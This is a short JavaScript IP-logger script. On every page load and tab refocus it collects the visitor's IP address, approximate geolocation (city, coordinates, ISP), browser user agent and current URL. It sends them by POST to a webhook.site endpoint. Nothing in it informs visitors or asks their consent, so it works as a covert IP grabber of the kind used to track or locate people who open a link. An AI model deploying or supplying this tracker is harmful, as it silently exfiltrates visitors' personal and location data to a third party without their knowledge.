// Function to get visitor's IP and send to webhook
async function logVisitorIP() {
    try {
        // First get the IP from ipify (more reliable)
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        // Then get location data from ip-api.com (more reliable and free)
        const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
        const locationData = await locationResponse.json();
        
        // Prepare the data to send to webhook
        const visitorData = {
            ip: ipData.ip,
            city: locationData.city,
            region: locationData.regionName,
            country: locationData.country,
            timezone: locationData.timezone,
            isp: locationData.isp,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            page: window.location.href,
            latitude: locationData.lat,
            longitude: locationData.lon
        };

        // Send to your webhook
        await fetch('https://webhook.site/f3c2acd8-51fb-456e-9b77-a8a3628b49af', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(visitorData)
        });

        console.log('IP logging successful:', visitorData); // Debug log
    } catch (error) {
        console.error('IP logging error:', error);
    }
}

// Log IP immediately when script loads
logVisitorIP();

// Also log on page visibility change (when user returns to the page)
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        logVisitorIP();
    }
}); 